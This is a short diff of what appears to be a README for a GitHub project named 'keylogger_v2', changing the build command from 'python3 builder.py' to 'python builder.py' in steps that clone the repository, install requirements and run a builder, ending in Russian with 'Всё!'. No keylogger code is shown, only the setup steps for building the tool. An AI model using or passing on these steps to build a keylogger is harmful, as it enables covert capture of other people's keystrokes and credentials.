@@ -4,7 +4,7 @@
   git clone https://github.com/eXedna/keylogger_v2
   cd keylogger_v2
   python3 -m pip install req.txt
-  python3 builder.py
+  python builder.py
 
 [+]  Всё!
 
